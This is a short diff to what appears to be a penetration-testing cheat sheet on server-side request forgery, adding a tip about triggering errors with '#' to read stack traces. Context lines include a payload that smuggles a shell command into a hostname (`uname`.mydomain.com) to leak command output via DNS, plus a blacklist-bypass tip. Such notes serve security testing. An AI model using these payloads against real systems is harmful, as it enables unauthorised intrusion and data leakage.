@@ -8,7 +8,8 @@ If you have SSRF, test for RCE with this payload:
 `uname`.mydomain.com
 ```
 
----
+## Trigger error
+* Add `#` while testing for SSRF in order to trigger errors and maybe read stacktraces
 
 ## Blacklist bypass
 * Pass URL encoded parameters in order to achieve parameter injection
